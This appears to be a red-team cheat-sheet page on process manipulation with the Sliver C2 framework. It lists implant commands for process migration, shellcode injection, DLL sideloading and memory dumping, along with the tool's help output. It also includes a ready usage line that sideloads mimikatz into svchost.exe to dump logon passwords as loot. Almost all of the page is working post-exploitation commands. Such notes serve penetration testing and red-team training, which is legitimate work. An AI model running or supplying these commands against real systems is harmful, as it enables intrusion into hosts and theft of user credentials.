# 11 - Process Manipulation

Search Tag(s): #sliver #command-and-control #interactive-shell

## Migrate Process

```
sliver (IMPLANT_NAME) > migrate -h
```

## Inject Shellcode

```
sliver (IMPLANT_NAME) > execute-shellcode -p <pid> shellcode.bin
```

## Inject, Spoof and Execute Process

### Help Menu

```
sliver (IMPLANT_NAME) > sideload -h

Command: sideload <options> <filepath to DLL>
About: Load and execute a shared library in memory in a remote process.
Example usage:

Sideload a MacOS shared library into a new process using DYLD_INSERT_LIBRARIES:
        sideload -p /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment -a 'Hello World' /tmp/mylib.dylib
Sideload a Linux shared library into a new bash process using LD_PRELOAD:
        sideload -p /bin/bash /tmp/mylib.so
Sideload a Windows DLL as shellcode in a new process using Donut, specifying the entrypoint and its arguments:
        sideload -e MyEntryPoint /tmp/mylib.dll "argument to the function MyEntryPoint"

Remarks:
Linux and MacOS shared library must call exit() once done with their jobs, as the Sliver implant will wait until the hosting process
terminates before responding. This will also prevent the hosting process to run indefinitely.
This is not required on Windows since the payload is injected as a new remote thread, and we wait for the thread completion before
killing the hosting process.

Parameters to the Linux and MacOS shared module are passed using the LD_PARAMS environment variable.


Usage:
======
  sideload [flags] filepath [args...]

Args:
=====
  filepath  string         path the shared library file
  args      string list    arguments for the binary (default: [])

Flags:
======
  -e, --entry-point       string    Entrypoint for the DLL (Windows only)
  -h, --help                        display help
  -k, --keep-alive                  don't terminate host process once the execution completes
  -X, --loot                        save output as loot
  -n, --name              string    name to assign loot (optional)
  -P, --ppid              uint      parent process id (optional) (default: 0)
  -p, --process           string    Path to process to host the shellcode (default: c:\windows\system32\notepad.exe)
  -A, --process-arguments string    arguments to pass to the hosting process
  -s, --save                        save output to file
  -t, --timeout           int       command timeout in seconds (default: 60)
  -w, --unicode                     Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)
```

### Usage

```
sliver (IMPLANT_NAME) > sideload -X -n external_credentials -p c:\windows\system32\svchost.exe /usr/share/windows-resources/mimikatz/x64/mimikatz.exe "sekurlsa::logonpasswords full" "exit"
```

## Inject DLL

### Spawn DLL

```
sliver (IMPLANT_NAME) 
```

```
sliver (IMPLANT_NAME) > spawndll
```

## Dump Memory From Process Identifier (PID)

### Help Menu

```
sliver (IMPLANT_NAME) > procdump -h

Command: procdump [pid]
About: Dumps the process memory given a process identifier (pid)

Usage:
======
  procdump [flags]

Flags:
======
  -h, --help                display help
  -X, --loot                save output as loot
  -N, --loot-name string    name to assign when adding the memory dump to the loot store (optional)
  -n, --name      string    target process name
  -p, --pid       int       target pid (default: -1)
  -s, --save      string    save to file (will overwrite if exists)
  -t, --timeout   int       command timeout in seconds (default: 60)
```

```
sliver (IMPLANT_NAME) > procdump -p <pid>
```

---
## References

- [DominicBreuker: Learning Sliver C2 (10) - Sideload](https://dominicbreuker.com/post/learning_sliver_c2_10_sideload/)